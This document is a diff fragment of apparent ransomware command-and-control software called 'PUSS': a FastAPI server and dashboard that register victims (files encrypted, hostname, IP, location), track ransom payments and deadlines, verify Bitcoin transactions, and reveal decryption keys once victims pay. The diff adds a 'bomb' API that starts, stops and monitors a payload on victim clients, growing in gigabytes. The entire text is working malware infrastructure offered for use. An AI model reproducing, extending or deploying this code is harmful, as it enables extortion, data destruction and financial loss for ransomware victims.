-                fetch('/api/logs?limit=50')
-            ]);
-            
-            const stats = await statsRes.json();
-            const victims = await victimsRes.json();
-            const logs = await logsRes.json();
-            
-            document.getElementById('timestamp').innerText = new Date().toLocaleString();
-            
+        let ws = null;
+        
+        async function loadStats() {
+            const r = await fetch('/api/stats');
+            const s = await r.json();
             document.getElementById('stats').innerHTML = `
-                <div class="stat"><div class="stat-value">${stats.total}</div><div class="stat-label">TOTAL</div></div>
-                <div class="stat"><div class="stat-value">${stats.paid}</div><div class="stat-label">PAID</div></div>
-                <div class="stat"><div class="stat-value">${stats.unpaid}</div><div class="stat-label">UNPAID</div></div>
-                <div class="stat"><div class="stat-value">${stats.expired}</div><div class="stat-label">EXPIRED</div></div>
-                <div class="stat"><div class="stat-value">${stats.total_btc}</div><div class="stat-label">BTC</div></div>
+                <div class="stat"><div class="value">${s.total}</div><div class="label">VICTIMS</div></div>
+                <div class="stat"><div class="value">${s.paid}</div><div class="label">PAID</div></div>
+                <div class="stat"><div class="value">${s.unpaid}</div><div class="label">UNPAID</div></div>
+                <div class="stat"><div class="value">${s.bombs}</div><div class="label">BOMBS</div></div>
             `;
-            
-            let victimsHtml = '';
-            for (const [id, v] of Object.entries(victims)) {
-                const deadline = new Date(v.payment_deadline).toLocaleString();
-                victimsHtml += `
-                    <div class="row">
-                        <div>${id}</div>
-                        <div>${v.files_encrypted}</div>
-                        <div>${v.hostname}</div>
-                        <div>${v.city}, ${v.country}</div>
-                        <div>${deadline}</div>
-                        <div><span class="badge ${v.status}">${v.status}</span></div>
-                        <div>${v.ransom}</div>
-                        <div><button class="button small" onclick="deleteVictim('${id}')">DELETE</button></div>
-                    </div>
-                `;
+        }
+        
+        async function loadVictims() {
+            const r = await fetch('/api/victims');
+            const v = await r.json();
+            let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>STATUS</th></tr>';
+            for (const [id, data] of Object.entries(v)) {
+                html += `<tr>
+                    <td>${id}</td>
+                    <td>${data.files}</td>
+                    <td>${data.city}, ${data.country}</td>
+                    <td class="status-${data.status}">${data.status}</td>
+                </tr>`;
             }
-            document.getElementById('victims').innerHTML = victimsHtml || '<div class="row">No victims</div>';
-            
-            let logsHtml = '';
-            logs.forEach(log => {
-                logsHtml += `<div class="log-entry">[${log.timestamp}] ${log.level}: ${log.message}</div>`;
+            document.getElementById('victims_table').innerHTML = html;
+        }
+        
+        async function loadLogs() {
+            const r = await fetch('/api/logs');
+            const l = await r.json();
+            let html = '';
+            l.slice(-20).forEach(log => {
+                html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
             });
-            document.getElementById('logs').innerHTML = logsHtml;
+            document.getElementById('logs').innerHTML = html;
         }
-
-        async function deleteVictim(id) {
-            if (confirm(`Delete ${id}?`)) {
-                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
-                loadData();
-            }
+        
+        function connectWS(client) {
+            if (ws) ws.close();
+            const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${proto}//${window.location.host}/ws/${client}`);
+            ws.onmessage = (e) => {
+                const d = JSON.parse(e.data);
+                if (d.type === 'progress') {
+                    document.getElementById('bomb_progress').style.display = 'block';
+                    document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
+                    document.getElementById('bomb_status').innerHTML = 
+                        `<div>Size: ${d.size_gb.toFixed(2)} GB</div>`;
+                }
+            };
         }
-
-        async function extendDeadline() {
-            const id = document.getElementById('victim_id').value;
-            const hours = document.getElementById('hours').value;
-            if (!id) return;
-            
-            await fetch('/api/victim/extend', {
+        
+        async function startBomb() {
+            const client = document.getElementById('bomb_client').value;
+            const file = document.getElementById('bomb_file').value;
+            if (!client) return alert('Enter Client ID');
+            connectWS(client);
+            const r = await fetch('/api/bomb/start', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({victim_id: id, hours: parseInt(hours)})
+                body: JSON.stringify({client_id: client, filename: file})
             });
-            loadData();
+            const d = await r.json();
+            if (d.success) alert('Bomb started');
         }
-
-        async function bulkDelete() {
-            const status = document.getElementById('bulk_status').value;
-            if (!confirm('Confirm bulk delete?')) return;
-            
-            await fetch('/api/victims/bulk', {
-                method: 'DELETE',
+        
+        async function stopBomb() {
+            const client = document.getElementById('bomb_client').value;
+            const r = await fetch('/api/bomb/stop', {
+                method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({status: status || null})
+                body: JSON.stringify({client_id: client})
             });
-            loadData();
+            const d = await r.json();
+            if (d.success) {
+                alert('Bomb stopped');
+                document.getElementById('bomb_progress').style.display = 'none';
+            }
         }
-
-        function refreshData() {
-            loadData();
+        
+        async function checkBomb() {
+            const client = document.getElementById('bomb_client').value;
+            const r = await fetch(`/api/bomb/status/${client}`);
+            const d = await r.json();
+            if (d.running) {
+                document.getElementById('bomb_status').innerHTML = 
+                    `Running: ${d.size_gb.toFixed(2)} GB`;
+            } else {
+                document.getElementById('bomb_status').innerHTML = 'No active bomb';
+            }
         }
-
-        async function logout() {
-            await fetch('/api/owner/logout');
-            window.location.href = '/';
+        
+        async function getVictim() {
+            const id = document.getElementById('victim_id').value;
+            const r = await fetch(`/api/victim/${id}`);
+            if (r.status === 200) {
+                const v = await r.json();
+                document.getElementById('victim_info').innerHTML = `
+                    ID: ${v.id}<br>
+                    Files: ${v.files}<br>
+                    Location: ${v.city}, ${v.country}<br>
+                    Status: ${v.status}<br>
+                    Deadline: ${v.deadline.slice(0,10)}<br>
+                    ${v.status === 'paid' ? 'Key: ' + v.key : ''}
+                `;
+            } else {
+                document.getElementById('victim_info').innerHTML = 'Not found';
+            }
         }
-
-        loadData();
-        setInterval(loadData, 30000);
+        
+        async function deleteVictim() {
+            const id = document.getElementById('victim_id').value;
+            if (!id) return;
+            if (confirm('Delete ' + id + '?')) {
+                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
+                loadVictims();
+            }
+        }
+        
+        setInterval(() => {
+            loadStats();
+            loadVictims();
+            loadLogs();
+        }, 3000);
+        
+        loadStats();
+        loadVictims();
+        loadLogs();
     </script>
 </body>
 </html>
@@ -877,80 +724,110 @@ DASHBOARD_HTML = """
 
 @app.get('/', response_class=HTMLResponse)
 async def index():
-    return INDEX_HTML.replace('{% if telegram.enabled %}CONNECTED{% else %}DISABLED{% endif %}', 
-                              'CONNECTED' if telegram.enabled else 'DISABLED')
-
-@app.get('/dashboard', response_class=HTMLResponse)
-async def dashboard():
-    return DASHBOARD_HTML
-
-@app.post('/api/owner/login')
-async def owner_login(login: OwnerLogin):
-    success = hmac.compare_digest(login.password.encode(), Config.OWNER_PASSWORD.encode())
-    return {'success': success}
-
-@app.get('/api/owner/logout')
-async def owner_logout():
-    return {'success': True}
+    return INDEX_HTML
 
 @app.get('/api/stats')
 async def get_stats():
     return db.get_stats()
 
+@app.get('/api/logs')
+async def get_logs(limit: int = 50):
+    return db.logs[-limit:]
+
 @app.get('/api/victims')
 async def get_victims():
     return db.get_all()
 
-@app.get('/api/victim/{victim_id}')
-async def get_victim(victim_id: str):
-    victim = db.get_victim(victim_id)
-    if not victim:
-        raise HTTPException(status_code=404, detail="Victim not found")
-    return victim
+@app.get('/api/victim/{vid}')
+async def get_victim(vid: str):
+    v = db.get_victim(vid)
+    if not v:
+        raise HTTPException(404)
+    return v
 
-@app.post('/api/victim')
-async def add_victim(victim: VictimCreate):
-    return db.add_victim(victim)
+@app.post('/api/add-victim')
+async def add_victim(req: Request):
+    data = await req.json()
+    v = db.add_victim(
+        victim_id=data.get('victim_id'),
+        files=data.get('files', 0),
+        hostname=data.get('hostname'),
+        ip=data.get('ip'),
+        country=data.get('country'),
+        city=data.get('city'),
+        lat=data.get('lat', 0),
+        lon=data.get('lon', 0),
+        os_info=data.get('os')
+    )
+    return v
 
-@app.post('/api/victim/verify')
-async def verify_payment(payment: PaymentVerify):
-    success = db.verify_payment(payment.victim_id, payment.tx_id)
+@app.post('/api/update-victim')
+async def update_victim(req: Request):
+    data = await req.json()
+    success = db.update_victim(data.get('victim_id'), {'files': data.get('files_encrypted')})
     return {'success': success}
 
-@app.post('/api/victim/extend')
-async def extend_deadline(extend: DeadlineExtend):
-    success = db.extend_deadline(extend.victim_id, extend.hours)
+@app.post('/api/verify-payment')
+async def verify_payment(req: Request):
+    data = await req.json()
+    success = db.verify_payment(data.get('victim_id'), data.get('tx_id'))
     return {'success': success}
 
-@app.delete('/api/victim/{victim_id}')
-async def delete_victim(victim_id: str):
-    success = db.delete_victim(victim_id)
+@app.delete('/api/victim/{vid}')
+async def delete_victim(vid: str):
+    success = db.delete_victim(vid)
     return {'success': success}
 
-@app.delete('/api/victims/bulk')
-async def bulk_delete(bulk: BulkDelete):
-    count = db.bulk_delete(bulk.status)
-    return {'count': count}
+# ============================================================================
+# BOMB API
+# ============================================================================
 
-@app.get('/api/logs')
-async def get_logs(limit: int = 100):
-    return db.get_logs(limit)
+class BombStart(BaseModel):
+    client_id: str
+    filename: str = "explosion.dat"
 
-@app.post('/api/telegram/test')
-async def test_telegram():
-    if not telegram.enabled:
-        return {'success': False, 'error': 'Telegram not configured'}
-    success = telegram.send("Test message from PUSS system")
+class BombStop(BaseModel):
+    client_id: str
+
+@app.post('/api/bomb/start')
+async def bomb_start(bomb: BombStart):
+    success = bomb_manager.start_bomb(bomb.client_id, bomb.filename)
+    if success:
+        db.log('info', f"Bomb started: {bomb.client_id}")
     return {'success': success}
 
-@app.get('/api/health')
+@app.post('/api/bomb/stop')
+async def bomb_stop(bomb: BombStop):
+    success = bomb_manager.stop_bomb(bomb.client_id)
+    if success:
+        db.log('info', f"Bomb stopped: {bomb.client_id}")
+    return {'success': success}
+
+@app.get('/api/bomb/status/{client_id}')
+async def bomb_status(client_id: str):
+    return bomb_manager.get_status(client_id)
+
+# ============================================================================
+# OWNER API (Protected)
+# ============================================================================
+
+@app.post('/api/owner/login')
+async def owner_login(req: Request):
+    data = await req.json()
+    success = data.get('password') == Config.OWNER_PASSWORD
+    return {'success': success}
+
+# ============================================================================
+# HEALTH
+# ============================================================================
+
+@app.get('/health')
 async def health():
     return {
-        'status': 'healthy',
-        'timestamp': datetime.now().isoformat(),
-        'version': '2.0.0',
-        'telegram': telegram.enabled,
-        'victims': len(db.victims)
+        'status': 'ok',
+        'time': datetime.now().isoformat(),
+        'victims': len(db.victims),
+        'bombs': len(bomb_manager.active_bombs)
     }
 
 # ============================================================================
@@ -959,20 +836,10 @@ async def health():
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 8000))
-    host = os.environ.get('HOST', '0.0.0.0')
-    
-    logger.info("=" * 50)
-    logger.info("PUSS CONTROL PANEL")
-    logger.info("=" * 50)
+    logger.info("="*50)
+    logger.info("PUSS SYSTEM v3.0")
     logger.info(f"Port: {port}")
-    logger.info(f"Host: {host}")
-    logger.info(f"Telegram: {'Enabled' if telegram.enabled else 'Disabled'}")
-    logger.info("=" * 50)
-    
-    uvicorn.run(
-        "main:app",
-        host=host,
-        port=port,
-        log_level=Config.LOG_LEVEL.lower(),
-        reload=Config.ENVIRONMENT == 'development'
-    )
+    logger.info(f"Victims: {len(db.victims)}")
+    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
+    logger.info("="*50)
+    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
